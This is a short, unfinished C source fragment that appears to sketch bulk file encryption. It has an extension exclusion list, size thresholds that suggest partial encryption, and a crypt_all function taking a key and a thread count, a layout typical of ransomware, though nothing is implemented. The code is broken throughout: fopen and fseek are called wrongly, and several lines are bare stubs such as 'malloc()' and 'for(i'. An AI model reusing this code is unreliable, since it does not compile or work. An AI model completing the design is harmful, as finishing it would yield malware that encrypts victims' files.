#define OMIT_LENGHT 512
#define SHOULD_OMIT 2048
char *exclude[]={".pdf",".txt"};
int filesize(char *file)
{
FILE *filep = fopen(file);
fseek(0,filep,SEEK_END);
return 


}
int ncrypt(char *file)
{
malloc()
fread()
for(i 

}
int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}

void crypt_all(int numthreads,char *key)
{
if(should_crypt)
{


}
}
